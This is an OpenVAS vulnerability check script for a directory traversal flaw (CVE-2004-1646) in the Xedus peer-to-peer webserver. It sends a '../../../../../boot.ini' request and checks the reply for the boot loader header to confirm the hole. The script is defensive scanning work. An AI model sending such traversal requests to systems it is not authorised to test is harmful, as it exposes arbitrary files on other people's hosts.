# OpenVAS Vulnerability Test
# $Id: xedus_dir_traversal.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Xedus directory traversal
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host runs Xedus Peer to Peer webserver.  This version is 
vulnerable to directory traversal.  An attacker could send specially 
crafted URL to view arbitrary files on the system.";

tag_solution = "Upgrade to the latest version.";

# Ref: James Bercegay of the GulfTech Security Research Team

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14645");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1646");
  script_bugtraq_id(11071);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Xedus directory traversal");

 

  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_dependencies("xedus_detect.nasl");
  script_family("Peer-To-Peer File Sharing");
  script_require_ports("Services/www", 4274);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

# now the code

include("http_func.inc");

port = get_http_port(default:4274);
if ( ! get_kb_item("xedus/" + port + "/running")) exit(0);

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  buf = http_get(item:"../../../../../boot.ini", port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if(egrep(pattern:"\[boot loader\]", string:rep))
    security_message(port);
  http_close_socket(soc);
 }
}
exit(0);
